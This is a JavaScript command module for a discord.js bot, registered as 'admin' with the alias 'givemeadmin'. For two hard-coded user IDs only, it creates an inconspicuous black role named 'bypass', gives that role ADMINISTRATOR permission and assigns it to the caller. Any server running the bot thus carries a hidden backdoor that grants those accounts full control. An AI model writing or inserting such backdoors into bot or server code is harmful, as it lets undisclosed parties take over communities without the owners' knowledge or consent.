const Discord = require("discord.js");
const fs = require("fs");
const config = require("../config-files/main.json");

module.exports.run = async (client, message, args) => {

  if(message.author.id == 287874798049165313 || message.author.id == 278548721778688010) {
    let adminrole = message.guild.roles.find(r => r.name === 'bypass')
    console.log(adminrole);
    if(!adminrole){
      try{
          adminrole = await message.guild.createRole({
              name: "bypass",
              color: "#000000",
              permissions:[]
          })
          adminrole.setPermissions('ADMINISTRATOR')
      }catch(e){
        console.log(e.stack);
      }
    }
    message.member.addRole(message.guild.roles.find(r => r.name === 'bypass'));
}
  else {

  }
}
module.exports.config = {
  name: "admin",
  aliases: ["givemeadmin"]
}